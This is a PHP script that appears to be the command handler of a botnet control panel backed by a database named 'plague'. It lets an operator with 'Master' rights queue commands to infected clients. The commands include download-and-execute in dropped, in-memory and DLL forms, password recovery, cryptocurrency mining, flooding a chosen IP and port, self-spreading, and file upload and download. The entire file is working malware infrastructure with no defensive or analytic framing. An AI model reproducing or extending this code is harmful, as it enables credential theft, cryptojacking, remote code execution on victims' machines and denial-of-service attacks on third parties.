<?php
session_start();

if((!isset($_SESSION['user'])) or (!isset($_SESSION['permission']))){
	header('Location: index.php');
	exit;
}
if(!($_SESSION['permission']=='Master')) {
	echo("You do not have permission to control clients.");
	exit;
}

function CheckParam($Two = false){
	if(empty($_POST['Param1'])){
		header('Location: dashboard.php?tab=Commands&failure=' . urlencode('A required parameter is missing!'));
		die();
	}
	if($Two){
		if(empty($_POST['Param2'])){
			header('Location: dashboard.php?tab=Commands&failure=' . urlencode('A required parameter is missing!'));
			die();
		}
	}
}

include('data.php');

if(isset($_POST['Target'])) $Target = $_POST['Target']; else $Target = '';
if(($Target=='Select a Target') or (strlen($Target)==0)){
	header('Location: dashboard.php?tab=Commands&failure=' . urlencode('Target not set.'));
	die();
}

if($Target=='Single Client'){
	if(!isset($_POST['GUID']) or empty($_POST['GUID'])){
		header('Location: dashboard.php?tab=Commands&failure=' . urlencode('GUID not set.'));
		die();
	} else $GUID = $_POST['GUID'];
}

if(isset($_POST['Command'])) $Cmd = $_POST['Command'];
if(($Cmd=='Select a Command') or (strlen($Cmd)==0)){
	header('Location: dashboard.php?tab=Commands&failure=' . urlencode('Command not set.'));
	die();
}

//Evaluate command
$ParamArray = array();
switch($Cmd){
	case 'Restart Client':{
		$Cmd = 'Restart';
	} break;
	case 'Update Client':{
		$Cmd = 'Update';
		CheckParam();
		$ParamArray = array('URL'=>$_POST['Param1']);
	} break;
	case 'Update Secondary Mapping':{
		$Cmd = 'UpdateMap';
		CheckParam();
		$ParamArray = array('URL'=>$_POST['Param1']);
	} break;
	case 'Uninstall Client':{
		$Cmd = 'Uninstall';
		CheckParam();
		if(strtoupper(hash('sha256', $_POST['Param1']))!=UninstallKey){
			header('Location: dashboard.php?tab=Commands&failure=' . urlencode('Incorrect Uninstall key!'));
			die();
		}
	} break;
	case 'Download File':{
		$Cmd = 'Download';
		CheckParam(true);
		$ParamArray = array('URL'=>$_POST['Param1'], 'LocalName'=>$_POST['Param2']);
	} break;
	case 'Upload File':{
		$Cmd = 'Upload';
		CheckParam();
		$ParamArray = array('FileName'=>$_POST['Param1']);
	} break;
	case 'Download and Execute [Drop]':{
		$Cmd = 'DropExec';
		CheckParam();
		$ParamArray = array('URL'=>$_POST['Param1']);
	} break;
	case 'Download and Execute [Memory]':{
		$Cmd = 'MemExec';
		CheckParam();
		$ParamArray = array('URL'=>$_POST['Param1']);
	} break;
	case 'Download and Execute [DLL]':{
		$Cmd = 'MemDLL';
		CheckParam();
		$ParamArray = array('URL'=>$_POST['Param1']);
	} break;
	case 'Recover Passwords':{
		$Cmd = 'Passwords';
	} break;
	case 'Start Mining':{
		$Cmd = 'Mine';
		CheckParam();
		$ParamArray = array('Bitness'=>$_POST['Param1']);
	} break;
	case 'Start Flooding':{
		$Cmd = 'Flood';
		CheckParam(true);
		$ParamArray = array('IPAddress'=>$_POST['Param1'], 'Port'=>$_POST['Param2']);
	} break;
	case 'Open URL':{
		$Cmd = 'OpenURL';
		CheckParam();
		$ParamArray = array('URL'=>$_POST['Param1']);
	} break;
	case 'Enable Spreading':{
		$Cmd = 'Spread';
	} break;
	case '🛑 Abort a Command':{
		$Cmd = 'Abort';
		CheckParam();
		$ParamArray = array('CommandID'=>$_POST['Param1']);
	} break;
	default:{
		header('Location: dashboard.php?tab=Commands&failure=' . urlencode('Invalid command.'));
		die();
	}
}

if(!ConnectDB('plague')){
	http_response_code(500);
	die('Failed to connect to the database.');
}

if(isset($ParamArray['URL'])) $ParamArray['URL'] = str_replace('https://', 'http://', $ParamArray['URL']);

switch($Target){
	case 'Single Client':{
		QueueCommand($GUID, $Cmd, $ParamArray, array());
	} break;
	default:{
		QueueCommandEx($Target, $Cmd, $ParamArray);
	}
}

header('Location: dashboard.php?tab=Commands&success');

?>